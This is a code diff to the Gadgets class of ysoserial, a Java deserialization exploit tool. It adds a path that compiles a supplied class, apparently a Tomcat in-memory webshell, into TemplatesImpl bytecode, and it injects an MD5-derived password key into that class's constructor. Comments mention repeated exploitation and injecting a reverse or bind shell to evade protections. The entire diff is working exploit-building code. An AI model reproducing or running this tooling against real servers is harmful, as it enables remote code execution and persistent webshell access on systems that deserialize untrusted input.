@@ -9,13 +9,13 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.math.BigInteger;
+import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.Map;
 
 import com.nqzero.permit.Permit;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
+import javassist.*;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -24,6 +24,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.tomcat.util.security.MD5Encoder;
+import sun.security.provider.MD5;
+import ysoserial.payloads.TomcatShell;
 
 
 /*
@@ -199,6 +202,12 @@ public class Gadgets {
         return createTemplatesImpl(command, template);
     }
 
+    public static Object createTemplatesImplTomcatShell(final String command) throws Exception {
+
+        String template = "";
+        return createTemplatesImpl(command, template);
+    }
+
     public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
         String param = command == null ? "cmd" : command;
         String template = "        try {\n" +
@@ -266,37 +275,68 @@ public class Gadgets {
 
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
-                command,
+                command,null,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
-                template);
+                template,null);
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, template);
+        return createTemplatesImpl(command,null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, template,null);
+    }
+    public static Object createTemplatesImpl ( final String command, final Class c,String mode ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                command, c,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
+                null,null);
+        }
+
+        return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class,null,mode);
     }
 
 
-    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template)
+    public static <T> T createTemplatesImpl(final String command, Class c,Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template,String mode)
         throws Exception {
         final T templates = tplClass.newInstance();
+        final byte[] classBytes;
+        if (c == null) {
+            // use template gadget class
+            ClassPool pool = ClassPool.getDefault();
+            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+            // run command in static initializer
+            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+            clazz.makeClassInitializer().insertAfter(template);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
 
-        clazz.makeClassInitializer().insertAfter(template);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
+             classBytes = clazz.toBytecode();
+        } else {
 
-        final byte[] classBytes = clazz.toBytecode();
-
+                    ClassPool pool = ClassPool.getDefault();
+                    pool.insertClassPath(new ClassClassPath(c));
+                    pool.insertClassPath(new ClassClassPath(abstTranslet));
+                    CtClass ctClass = pool.getCtClass(c.getName());
+                    CtClass superC = pool.get(abstTranslet.getName());
+                    ctClass.setSuperclass(superC);
+            if (!"inject".equals(mode)) {
+                    CtConstructor constructor = ctClass.getDeclaredConstructor(null);
+                    MessageDigest md = MessageDigest.getInstance("MD5");
+                    md.update(command.getBytes());
+                    String keyInit = String.format("key = \"%s\";", command == null ? "a65cccfcfd8f670d" : new BigInteger(1, md.digest()).toString(16).substring(0,16));
+                    constructor.insertBefore(keyInit);
+                    classBytes = ctClass.toBytecode();
+                }else {
+                    classBytes = ctClass.toBytecode();
+                }
+        }
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
 
